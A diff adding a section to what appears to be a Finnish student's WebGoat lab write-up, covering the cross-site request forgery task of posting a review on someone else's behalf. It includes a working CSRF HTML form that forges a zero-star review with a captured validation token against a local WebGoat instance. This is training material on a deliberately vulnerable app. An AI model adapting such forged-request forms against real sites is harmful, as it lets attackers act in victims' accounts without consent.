@@ -380,10 +380,27 @@ Html: </br>
 
 #### 4 "Post a review on someone else’s behalf"
 
-
-
-
-
+Seurasin tässäkin tehtävässä [Evidence Mondayn](https://medium.com/@evidencemonday/webgoat-cross-site-request-forgery-solution-1c069985e80f) artikkelia. </br>
+Tehtävä neljä oli aika suoraviivainen edellisen tehtävän ansiosta, koska se noudatti täysin samaa logiikkaa. </br>
+Html-tiedostoa tuli vain muuttaa hiukan päättämällä "action" rivin osoitteen "review"-tyypiksi ja yksi lisärivi "validateReq", johon arvoksi Developer Toolin Network välilehdeltä Request kohdasta sai varmenteen.</br>
+Html: </br>
+```
+<html>
+<body>
+ <form action="http://localhost:8081/WebGoat/csrf/review" method="POST">
+  <input name="reviewText" value="Utter Trash!" type="hidden">
+  <input name="stars" type="hidden" value="0">
+  <input name="validateReq" type="hidden" value="2aa14227b9a13d0bede0388a7fba9aa9">
+  <input type="submit" value="Submit">
+ </form>
+</body>
+</html>
+```
+![Screenshot 2023-04-16 153441](https://user-images.githubusercontent.com/116954333/232313306-e2152953-bbdd-4e0e-8881-04df1bf83fc3.png)
+![Screenshot 2023-04-16 155657](https://user-images.githubusercontent.com/116954333/232313327-5a76a69b-4043-44f8-b8ba-708467cfcd6a.png)
+![Screenshot 2023-04-16 153548](https://user-images.githubusercontent.com/116954333/232313314-4cfa0f9d-c301-461b-9534-a2e0750862f1.png)
+![Screenshot 2023-04-16 153611](https://user-images.githubusercontent.com/116954333/232313315-a75e155f-14ce-4973-958b-f4e1bc72af55.png)
+![Screenshot 2023-04-16 153807](https://user-images.githubusercontent.com/116954333/232313332-a4c69123-0aee-47c2-825a-34e421e3b70e.png)
 
 
 ## Lähteet
